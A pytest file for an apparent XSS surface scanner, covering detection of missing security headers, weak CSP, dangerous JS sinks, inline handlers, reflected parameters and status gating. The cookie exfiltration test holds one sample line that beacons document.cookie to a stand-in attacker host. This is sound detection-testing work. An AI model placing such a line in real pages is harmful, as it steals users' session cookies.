"""Tests for live XSS surface analysis (app/engines/live_xss.py).

Covers: missing/weak security headers, dangerous JS patterns (HTML + external
JS bundles), inline handlers, srcdoc sinks, cookie exfiltration, reflected
params, and the 2xx-only rule (error pages must not produce findings).
"""

from __future__ import annotations

from app.engines.live_xss import analyze_page_xss


def _page(
    *,
    url: str = "http://app/",
    status: int = 200,
    body: str = "<html><body>ok</body></html>",
    content_type: str = "text/html; charset=utf-8",
    headers: dict[str, str] | None = None,
) -> dict:
    return {
        "url": url,
        "status": status,
        "body": body,
        "content_type": content_type,
        "headers": headers or {},
    }


def _rules(findings) -> set[str]:
    return {f["rule"] for f in findings}


# ---------------------------------------------------------------------------
# Security headers
# ---------------------------------------------------------------------------

def test_missing_csp_and_headers_reported() -> None:
    findings = analyze_page_xss(_page())
    rules = _rules(findings)
    assert "XS-LIVE-001" in rules       # missing CSP
    assert "XS-LIVE-011" in rules       # missing nosniff
    assert "XS-LIVE-012" in rules       # missing clickjacking protection


def test_hsts_only_reported_over_https() -> None:
    # HTTP page: no HSTS finding (HSTS is meaningless without TLS)
    http_rules = _rules(analyze_page_xss(_page(url="http://app/")))
    assert "XS-LIVE-022" not in http_rules

    # HTTPS page without HSTS: finding present
    https_rules = _rules(analyze_page_xss(_page(url="https://app/")))
    assert "XS-LIVE-022" in https_rules

    # HTTPS page WITH HSTS: no finding
    ok_rules = _rules(analyze_page_xss(_page(
        url="https://app/",
        headers={"strict-transport-security": "max-age=31536000"},
    )))
    assert "XS-LIVE-022" not in ok_rules


def test_referrer_and_permissions_policy_headers() -> None:
    rules = _rules(analyze_page_xss(_page()))
    assert "XS-LIVE-023" in rules  # missing referrer-policy
    assert "XS-LIVE-024" in rules  # missing permissions-policy

    ok = analyze_page_xss(_page(headers={
        "referrer-policy": "strict-origin-when-cross-origin",
        "permissions-policy": "camera=()",
    }))
    assert "XS-LIVE-023" not in _rules(ok)
    assert "XS-LIVE-024" not in _rules(ok)


def test_weak_csp_reported() -> None:
    csp = (
        "default-src 'self'; "
        "script-src 'self' 'unsafe-inline' 'unsafe-eval'"
    )
    findings = analyze_page_xss(_page(headers={
        "content-security-policy": csp,
    }))
    assert "XS-LIVE-002" in _rules(findings)


# ---------------------------------------------------------------------------
# Dangerous JS patterns (HTML + external JS)
# ---------------------------------------------------------------------------

def test_dangerous_js_patterns_in_html() -> None:
    body = (
        "<html><script>"
        "eval(location.hash.slice(1));"
        "document.write('<b>x</b>');"
        "el.innerHTML = data;"
        "</script></html>"
    )
    rules = _rules(analyze_page_xss(_page(body=body)))
    assert "XS-LIVE-005" in rules  # eval
    assert "XS-LIVE-004" in rules  # document.write
    assert "XS-LIVE-003" in rules  # innerHTML


def test_external_js_bundle_is_analyzed() -> None:
    """External JS files (non-HTML) must be scanned for dangerous patterns.

    Previously analyze_page_xss returned early for any non-HTML content type,
    so a site's own JS bundle with eval()/innerHTML was never flagged.
    """
    body = (
        "const el = document.getElementById('x');\n"
        "el.innerHTML = location.hash;\n"
        "setTimeout('doThing()', 1000);\n"
    )
    findings = analyze_page_xss(_page(
        url="https://app/static/app.js",
        body=body,
        content_type="application/javascript",
        headers={"content-type": "application/javascript"},
    ))
    rules = _rules(findings)
    assert "XS-LIVE-003" in rules   # innerHTML in JS bundle
    assert "XS-LIVE-006" in rules   # setTimeout(string) in JS bundle
    # HTML-only checks must NOT fire for a JS file.
    assert "XS-LIVE-001" not in rules
    assert "XS-LIVE-011" not in rules


def test_react_and_vue_sinks_detected() -> None:
    body = 'dangerouslySetInnerHTML={{__html: userInput}};'
    findings = analyze_page_xss(_page(
        url="https://app/bundle.js",
        body=body,
        content_type="application/javascript",
    ))
    assert "XS-LIVE-020" in _rules(findings)

    # Vue template form (v-html="...") as served in SSR/inline template.
    vue = '<div v-html="userInput"></div>'
    findings2 = analyze_page_xss(_page(
        url="https://app/page.html",
        body=vue,
        content_type="text/html",
    ))
    assert "XS-LIVE-021" in _rules(findings2)


# ---------------------------------------------------------------------------
# Inline handlers + srcdoc
# ---------------------------------------------------------------------------

def test_inline_handlers_and_srcdoc() -> None:
    body = (
        '<html><body>'
        '<button onclick="go()">x</button>'
        '<iframe srcdoc="<p>hi</p>"></iframe>'
        "</body></html>"
    )
    rules = _rules(analyze_page_xss(_page(body=body)))
    assert "XS-LIVE-013" in rules  # inline handlers
    assert "XS-LIVE-018" in rules  # iframe srcdoc


# ---------------------------------------------------------------------------
# Cookie exfiltration
# ---------------------------------------------------------------------------

def test_cookie_exfil_to_external_origin_detected() -> None:
    body = (
        "navigator.sendBeacon('https://evil.example.com/collect', document.cookie);"
    )
    findings = analyze_page_xss(_page(
        url="https://app/",
        body=body,
        content_type="application/javascript",
    ))
    assert "XS-LIVE-019" in _rules(findings)


def test_cookie_use_without_external_origin_not_flagged() -> None:
    # Same-origin / no fetch context — must not be flagged as exfiltration.
    body = (
        "fetch('/api/token', {body: document.cookie});"
        "const c = document.cookie;"
    )
    findings = analyze_page_xss(_page(
        url="https://app/",
        body=body,
        content_type="application/javascript",
    ))
    assert "XS-LIVE-019" not in _rules(findings)


# ---------------------------------------------------------------------------
# Reflected params
# ---------------------------------------------------------------------------

def test_reflected_param_detected() -> None:
    page = _page(
        url="http://app/search?q=hello123",
        body="<html><p>Results for hello123</p></html>",
    )
    rules = _rules(analyze_page_xss(page))
    assert "XS-LIVE-017" in rules


def test_html_encoded_reflection_not_flagged() -> None:
    # Value carries HTML-special characters; the body only contains the
    # HTML-encoded form → intentional encoding, no finding.
    page = _page(
        url="http://app/search?q=a%3Cb%3Ec",
        body="<html><p>Results for a&lt;b&gt;c</p></html>",
    )
    rules = _rules(analyze_page_xss(page))
    assert "XS-LIVE-017" not in rules


# ---------------------------------------------------------------------------
# 2xx-only + content-type gating
# ---------------------------------------------------------------------------

def test_error_pages_are_not_analyzed() -> None:
    """404/500 pages must not produce XSS/header findings (false positives)."""
    for status in (404, 403, 500, 301):
        rules = _rules(analyze_page_xss(_page(status=status)))
        assert rules == set(), f"status {status} produced findings: {rules}"


def test_non_html_non_js_skipped() -> None:
    page = _page(
        body='{"data": "eval(x)"}',
        content_type="application/json",
    )
    assert analyze_page_xss(page) == []
